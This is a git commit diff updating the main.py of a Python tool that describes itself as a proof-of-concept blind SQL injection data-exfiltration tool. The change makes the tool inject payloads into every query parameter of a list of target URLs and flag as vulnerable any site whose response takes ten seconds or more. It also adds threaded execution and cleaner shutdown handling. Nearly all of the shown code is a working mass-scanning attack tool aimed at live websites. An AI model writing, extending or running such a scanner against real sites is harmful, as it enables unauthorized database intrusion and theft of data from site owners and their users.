bbcd1afbb3cc035607c50874181443331a1674d9
KonaN <87090666+KKonaNN@users.noreply.github.com>
2024-09-21 16:31:58 +0100

    Update main.py
    now it inject on all query params not only the last one and fixed exit threads killing process

--- main.py
+++ main.py
@@ -3,13 +3,9 @@ import sys
 import requests
 import argparse
 import colorama
-import os
-import time
-import threading
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from urllib.parse import urlparse, quote
-from bs4 import BeautifulSoup
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from pystyle import Center, Colors, Colorate, System, Write
 
 colorama.init(autoreset=True)
@@ -21,7 +17,7 @@ __________  _________________  .____    .___
  |    |   \/        \/   \_/.  \    |___|   |
  |______  /_______  /\_____\ \_/_______ \___|
         \/        \/        \__>       \/    
-                
+
                     By KonaN<3
 """
 
@@ -45,27 +41,42 @@ class Logging:
         cls.log(Colorate.Diagonal(Colors.green_to_cyan, msg))
 
 def signal_handler(sig, frame):
+    global stop_flag
     Logging.error("[x] Stopping...")
+    stop_flag = True
+    executor.shutdown(wait=True)
     output.close()
-    quit()
+    sys.exit(0)
+
+def parse_query(query):
+    return parse_qs(query, keep_blank_values=True)
 
 def exploit(url, payload):
+    global stop_flag
     try:
-        link = f"{url}{payload}"
-        response = requests.get(link, timeout=20, verify=not args.no_ssl_verify)
-        response_time = round(response.elapsed.total_seconds(), 2)
+        parsed_url = urlparse(url)
+        query_params = parse_query(parsed_url.query)
 
-        if response.status_code != 404 and response_time >= 10:
-            Logging.success(f"[ ✓ ] Found!: {link} | Time: {response_time}")
-            output.write(f"{link}\n")
-        elif not args.hide_fail:
-            Logging.error(f"[ X ] Not Vulnerable: {link} | Time: {response_time}")
-    except requests.RequestException:
+        for param in query_params:
+            if stop_flag:
+                return
+            original_value = query_params[param][0]
+            query_params[param] = original_value + payload
+            modified_query = urlencode(query_params, doseq=True)
+            modified_url = urlunparse(parsed_url._replace(query=modified_query))
+
+            response = requests.get(modified_url, timeout=20, verify=not args.no_ssl_verify)
+            response_time = round(response.elapsed.total_seconds(), 2)
+
+            if response.status_code != 404 and response_time >= 10:
+                Logging.success(f"[ ✓ ] Found!: {modified_url} | Time: {response_time}")
+                output.write(f"{modified_url}\n")
+            elif not args.hide_fail:
+                Logging.error(f"[ X ] Not Vulnerable: {modified_url} | Time: {response_time}")
+
+            query_params[param] = original_value
+    except Exception as e:
         pass
-
-def url_has_query(url):
-    parsed_url = urlparse(url)
-    return bool(parsed_url.query) and any(param.split('=')[0] for param in parsed_url.query.split('&'))
 
 def main():
     parser = argparse.ArgumentParser(description='Proof of Concept Blind SQL LIKE CLAUSE Data Exfiltration Tool')
@@ -82,7 +93,8 @@ def main():
         parser.print_help(sys.stderr)
         sys.exit(1)
 
-    global output, args
+    global output, args, stop_flag, executor
+    stop_flag = False
     args = parser.parse_args()
     urls = open(args.file, 'r').read().splitlines() if args.file else [args.url] if args.url else []
     Logging.info(f"[!] Found a total of {len(urls)} URLs")
@@ -93,17 +105,23 @@ def main():
     if args.no_ssl_verify:
         requests.packages.urllib3.disable_warnings()
 
-    tasks = [(url, payload.rstrip()) for url in urls if url_has_query(url) or (Logging.error(f"[x] skipping {url} due to no query") if not args.hide_fail else False) for payload in payloads]
+    tasks = [(url, payload.rstrip()) for url in urls if len(parse_query(
+        urlparse(url).query
+    )) > 0 or (Logging.error(f"[x] skipping {url} due to no query") if not args.hide_fail else False) for payload in payloads]
 
-    with ThreadPoolExecutor(max_workers=args.threads) as executor:
-        futures = [executor.submit(exploit, task[0], task[1]) for task in tasks]
+    executor = ThreadPoolExecutor(max_workers=args.threads)
+    futures = [executor.submit(exploit, task[0], task[1]) for task in tasks]
 
+    try:
         for future in as_completed(futures):
             try:
                 future.result()
             except Exception:
                 pass
+    except KeyboardInterrupt:
+        signal_handler(None, None)
 
+    executor.shutdown(wait=True)
     output.close()
 
 if __name__ == "__main__":
